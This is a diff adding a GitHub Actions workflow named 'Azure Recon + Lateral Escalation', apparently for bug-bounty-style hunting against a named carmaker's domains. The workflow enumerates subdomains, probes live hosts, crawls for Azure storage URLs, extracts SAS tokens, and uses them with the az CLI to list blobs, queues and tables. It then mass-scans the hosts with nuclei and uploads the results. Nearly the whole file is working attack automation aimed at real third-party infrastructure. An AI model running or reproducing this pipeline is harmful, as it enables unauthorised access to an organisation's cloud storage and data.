@@ -1,0 +1,104 @@
+name: Azure Recon + Lateral Escalation
+
+on:
+  workflow_dispatch:
+  push:
+    branches:
+      - main
+
+jobs:
+  azure-hunting:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v3
+
+      - name: Setup Go
+        uses: actions/setup-go@v5
+        with:
+          go-version: '1.23'
+
+      - name: Install Tools
+        run: |
+          sudo apt update && sudo apt install -y jq unzip python3 python3-pip
+          go install github.com/tomnomnom/assetfinder@latest
+          go install github.com/projectdiscovery/httpx/cmd/httpx@latest
+          go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
+          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+          go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+          go install github.com/projectdiscovery/katana/cmd/katana@latest
+          pip install azure-cli
+
+      - name: Scope Setup
+        run: |
+          echo "*.mbos.cloud
+          *.mbos.mercedes-benz.com
+          *.dvb.corpinter.net
+          *.rsu.corpinter.net
+          *.azure.mercedes-benz.com
+          *.mbos.net.cn
+          *.mbos.mercedes-benz.com.cn
+          *.azure.mercedes-benz.com.cn
+          *.dvb.corpinter.net.cn
+          *.rsu.mercedes-benz.cn" > scope.txt
+
+      - name: Subdomain Enumeration
+        run: |
+          subfinder -dL scope.txt -all -silent > subs_subfinder.txt
+          assetfinder --subs-only $(cat scope.txt | tr -d '*') | sort -u > subs_assetfinder.txt
+          cat subs_subfinder.txt subs_assetfinder.txt | sort -u > all_subs.txt
+
+      - name: DNS Resolve
+        run: |
+          cat all_subs.txt | dnsx -silent -resp -r 1.1.1.1,8.8.8.8 -o resolved.txt
+
+      - name: Alive Hosts
+        run: |
+          cat resolved.txt | httpx -silent -status-code -title -ip -o alive.txt
+
+      - name: Crawl & Detect Azure URLs
+        run: |
+          katana -list alive.txt -d 3 -silent | tee crawl_raw.txt | \
+          grep -Ei "blob\.core\.windows\.net|queue\.core\.windows\.net|table\.core\.windows\.net|function\.azurewebsites\.net" | sort -u > azure_urls.txt
+
+      - name: Extract & Test SAS Tokens
+        run: |
+          mkdir -p azure_findings
+          python3 << 'EOF'
+          import re, os, subprocess
+
+          with open('azure_urls.txt') as f:
+              urls = [u.strip() for u in f if u.strip()]
+
+          sas_pattern = re.compile(r"(https://[^\s]+)\?([^\"\'\s]+sig=[a-zA-Z0-9%]+)", re.IGNORECASE)
+
+          for url in urls:
+              m = sas_pattern.search(url)
+              if not m:
+                  continue
+              base_url, sas_token = m.groups()
+              if "blob.core.windows.net" in base_url:
+                  subprocess.run(f"az storage blob list --container-name {base_url.split('/')[-2]} --account-name {base_url.split('.')[0].split('//')[1]} --sas-token '{sas_token}' --output table", shell=True, check=False)
+              elif "queue.core.windows.net" in base_url:
+                  subprocess.run(f"az storage queue list --account-name {base_url.split('.')[0].split('//')[1]} --sas-token '{sas_token}' --output table", shell=True, check=False)
+              elif "table.core.windows.net" in base_url:
+                  subprocess.run(f"az storage table list --account-name {base_url.split('.')[0].split('//')[1]} --sas-token '{sas_token}' --output table", shell=True, check=False)
+              elif "function.azurewebsites.net" in base_url:
+                  subprocess.run(f"curl -s '{url}'", shell=True, check=False)
+          EOF
+
+      - name: Vulnerability Scan
+        run: |
+          nuclei -l alive.txt -severity low,medium,high,critical -c 50 -rl 50 -timeout 10 -o nuclei_results.txt
+
+      - name: Upload Results
+        uses: actions/upload-artifact@v4
+        with:
+          name: azure-lateral-escalation-results
+          path: |
+            all_subs.txt
+            resolved.txt
+            alive.txt
+            crawl_raw.txt
+            azure_urls.txt
+            nuclei_results.txt
